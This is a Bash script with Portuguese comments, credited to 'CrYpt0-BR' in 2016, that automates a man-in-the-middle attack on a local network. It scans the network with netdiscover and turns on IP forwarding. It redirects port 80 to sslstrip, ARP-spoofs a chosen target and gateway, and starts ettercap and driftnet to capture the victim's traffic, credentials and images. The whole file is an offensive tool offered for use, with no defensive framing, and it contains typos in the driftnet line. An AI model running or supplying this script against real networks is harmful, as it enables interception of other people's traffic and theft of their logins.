#!/bin/bash

# Limapando terminal
clear

echo "#####################################################################"
echo "####### CRYPTO-BR_MIDDLE      #######################################"
echo "####### Create by: CrYpt0-BR  #######################################"
echo "####### 2016                  #######################################"
echo "#####################################################################"
echo ""
echo ""

# Entrada da dados
echo "Informe a rede a qual você esta para realizar um scanner:  "
echo "EX: 192.168.0.0/24 "
read REDE
netdiscover -r $REDE -P

echo "#####################################################################"
sleep 2
echo "Informe a interface de rede que está utilizando no momento:  "
echo "EX: eth0, wlan0"
read INTERFACE
echo "Informe IP do alvo"
read IP_ALVO
echo "Informe o Gateway da rede"
read GW

# Habilitando roteamento
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "Roteamento Habilitado"
sleep 1

# Criando o redirect
iptables  -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 7777
echo "Redirecionamento Feito"
sleep 1

# Abrindo terminal com arpspoof 
gnome-terminal -x sh -c "arpspoof -i $INTERFACE -t $IP_ALVO $GW; exec bash"

# Abrindo terminal com sslstrip
gnome-terminal -x sh -c "sslstrip -l 7777; exec bash"

# Abrindo terminal com ettercap
gnome-terminal -x sh -c "ettercap -Tq -i $INTERFACE; exec bash";

# Abrindo terminal com DriftNet
gnome-terminal -x sh -c "driftinet -i $INTERNFACE; exec bash";
